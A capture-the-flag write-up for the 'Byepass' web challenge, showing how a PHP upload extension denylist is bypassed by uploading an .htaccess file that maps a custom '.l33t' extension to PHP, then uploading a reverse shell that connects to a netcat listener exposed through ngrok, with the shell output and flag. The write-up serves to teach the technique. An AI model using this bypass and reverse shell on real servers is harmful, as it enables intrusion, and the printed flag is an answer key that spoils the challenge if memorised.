# Byepass

## Description
Author: @JohnHammond#6971

Help yourself Say Goodbye to days gone by with our easy online service! Upload your photos to capture the memory, cherish them with friends and family, and savor the time we have together!

Retrieve the flag out of the root of the filesystem /flag.txt.

Press the Start button on the top-right to begin this challenge.
Attachments: [byepass.7z](https://ctf.nahamcon.com/files/aea4e6af39403351d847ee556e51822e/byepass.7z?token=eyJ1c2VyX2lkIjoxNDI1LCJ0ZWFtX2lkIjo3NzUsImZpbGVfaWQiOjI0fQ.Y51iQA.nuBymFORKVtG9If-XqKNFLuez24)

## Solve

Inside of the `save_memories.php` file we see it is blocking all executable php extensions:
```php
$ext_denylist = array(
    "php",
    "php2",
    "php3",
    "php4",
    "php5",
    "php6",
    "php7",
    "phps",
    "phps",
    "pht",
    "phtm",
    "phtml",
    "pgif",
    "shtml",
    "phar",
    "inc",
    "hphp",
    "ctp",
);
```

The code will check if we have a blank filename, an extension matching `ext_denylist`, or a file over 500000 bytes. If any of these are true the file will not upload.

I tried double extensions, adding in a null byte, and a few other tricks but none of these made the files executable once uploaded.

Then I came accross [this](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass) lab by PortSwingger and figured out another solution.

Before uploading any files I set up a listener with `nc -lnvp 4444` and used `ngrok tcp 4444` to expose my local port to the internet. Then I edited `shell.php` to the hostname and port that ngrok gave me.

I opened the site in burpsuite and uploaded my `shell.php` file. Then I changed the `filename` parameter to `.htaccess` and replaced the contents of the upload with `AddType application/x-httpd-php .l33t`.

The `.htaccess` file is a configuration file in apache that tells the apache server specific settings to apply in the current directory. With this upload we are telling the server to treat the `.l33t` extension as php which we can execute.

Then I sent another request to upload my `shell.php` file but changed the extension in the `filename` parameter to `.l33t`.

Once I send a request for the `/shell.l33t` file I get a connection in my terminal and `cat` out the flag.
```
Connection from 127.0.0.1:33710
Linux byepass-95b1048df7a3140a-7d758448f7-jrr6r 5.10.133+ #1 SMP Sun Sep 11 08:45:44 UTC 2022 x86_64 GNU/Linux
 14:53:33 up 15 days,  7:37,  0 users,  load average: 1.09, 0.43, 0.32
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /flag.txt
flag{32697ad7acd2d4718758d9a5ee42965d}
```

## Flag
```
flag{32697ad7acd2d4718758d9a5ee42965d}
```